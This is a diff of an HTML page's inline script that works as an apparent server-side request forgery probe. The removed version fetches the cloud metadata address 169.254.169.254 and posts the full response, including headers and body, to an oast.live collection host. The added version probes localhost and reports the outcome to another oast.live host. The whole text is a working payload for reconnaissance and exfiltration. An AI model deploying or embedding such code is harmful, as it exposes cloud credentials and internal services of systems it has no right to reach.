@@ -5,53 +5,34 @@
   <div id="result1"></div>
   
   <script>
-  fetch("http://169.254.169.254/")
-  .then(async r => {
-    const body = await r.text();
-
-    const headers = {};
-    for (const [key, value] of r.headers.entries()) {
-      headers[key] = value;
-    }
-
-    const responseData = {
-      status: r.status,
-      statusText: r.statusText,
-      url: r.url,
-      redirected: r.redirected,
-      headers: headers,
-      body: body
-    };
-
-    document.getElementById("result1").textContent =
-      JSON.stringify(responseData, null, 2);
-
-    fetch("https://d9scv62mruosdl6tl2n0yisugu31dwoow.oast.live/", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(responseData)
+    fetch("http://localhost/", {
+      mode: "no-cors"
+    })
+    .then(r => {
+      fetch("https://d9snkcimruoij3kjgbog76tytcn3omxq1.oast.live/", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          type: "success",
+          status: r.status,
+          type: r.type
+        })
+      });
+    })
+    .catch(err => {
+      fetch("https://d9snkcimruoij3kjgbog76tytcn3omxq1.oast.live/", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          type: "error",
+          error: String(err)
+        })
+      });
     });
-  })
-  .catch(async err => {
-    const errorData = {
-      error: String(err),
-      message: err?.message || null,
-      stack: err?.stack || null
-    };
-
-    document.getElementById("result1").textContent =
-      JSON.stringify(errorData, null, 2);
-
-    fetch("https://d9scv62mruosdl6tl2n0yisugu31dwoow.oast.live/", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(errorData)
-    }).catch(() => {});
-  });
     
   </script>
 
